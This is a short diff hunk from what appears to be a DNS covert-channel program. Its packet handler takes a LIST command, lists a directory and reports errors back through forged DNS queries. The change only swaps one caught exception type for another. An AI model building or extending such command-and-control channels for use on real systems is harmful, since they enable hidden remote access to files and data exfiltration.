@@ -72,7 +72,7 @@ def packet_handler(pkt):
         if argv[0] == LIST:
             try:
                 contents = list_directory(argv[1])
-            except FileNotFoundError:
+            except DirectoryNotFound:
                 # Send error message back.
                 query = forge_dns_query(data="ERROR")
                 send_dns_query(query)
